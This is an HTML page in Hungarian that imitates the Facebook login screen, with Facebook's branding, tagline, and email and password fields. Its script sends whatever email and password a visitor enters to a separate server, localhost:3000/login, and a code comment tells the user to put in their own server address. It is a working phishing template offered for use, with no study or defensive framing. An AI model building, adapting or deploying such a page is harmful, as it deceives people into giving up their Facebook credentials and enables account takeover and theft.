<!DOCTYPE html>
<html lang="hu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Bejelentkezés</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1>facebook</h1>
            <p>Csatlakozz a barátaiddal és ismerőseiddel a Facebookon.</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form onsubmit="login(event)">
                    <input type="email" id="email" placeholder="Email cím vagy telefonszám" required>
                    <input type="password" id="password" placeholder="Jelszó" required>
                    <button type="submit">Bejelentkezés</button>
                    <a href="#">Elfelejtetted a jelszavad?</a>
                    <hr>
                    <button class="signup-btn">Új fiók létrehozása</button>
                </form>
                <p id="status-message"></p>
            </div>
        </div>
    </div>

    <script>
        function login(event) {
            event.preventDefault(); // Megakadályozza az alapértelmezett formbeküldést

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Adatok küldése a szerverre AJAX segítségével
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "http://localhost:3000/login", true);  // Itt add meg a saját szerver címedet
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            xhr.send(JSON.stringify({
                email: email,
                password: password
            }));

            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (response.success) {
                        document.getElementById("status-message").textContent = "Sikeres bejelentkezés!";
                    } else {
                        document.getElementById("status-message").textContent = "Sikertelen bejelentkezés!";
                    }
                }
            };
        }
    </script>
</body>
</html>
